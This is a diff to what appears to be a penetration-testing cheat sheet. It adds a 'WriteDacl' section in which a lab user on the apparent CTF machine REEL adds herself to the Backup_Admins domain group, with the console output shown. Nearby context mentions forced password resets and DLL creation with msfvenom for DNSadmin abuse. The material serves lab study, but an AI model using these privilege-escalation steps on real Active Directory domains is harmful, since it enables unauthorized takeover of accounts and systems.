@@ -1014,6 +1014,41 @@ PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -identity cl
 PS C:\Users\tom\Desktop\AD Audit\BloodHound>    
 ```
 
+## WriteDacl
+	
+    net group backup_admins
+    net group backup_admins claire /add
+
+```bash
+claire@REEL C:\Users\claire>net group backup_admins                                                                                                                     
+Group name     Backup_Admins                                                                                                                                            
+Comment                                                                                                                                                                 
+                                                                                                                                                                        
+Members                                                                                                                                                                 
+
+-------------------------------------------------------------------------------                                                 
+ranj                                                                                                                            
+The command completed successfully.                                                                                             
+
+
+claire@REEL C:\Users\claire>net group backup_admins claire /add                                                                 
+The command completed successfully.                                                                                             
+
+
+claire@REEL C:\Users\claire>net group backup_admins                                                                             
+Group name     Backup_Admins                                                                                                    
+Comment                                                                                                                         
+
+Members                                                                                                                         
+
+-------------------------------------------------------------------------------                                                 
+claire                   ranj                                                                                                   
+The command completed successfully.                                                                                             
+
+
+claire@REEL C:\Users\claire>exit 
+```
+
 ## DNSadmin abuse
 
 Create dll with msfvenom
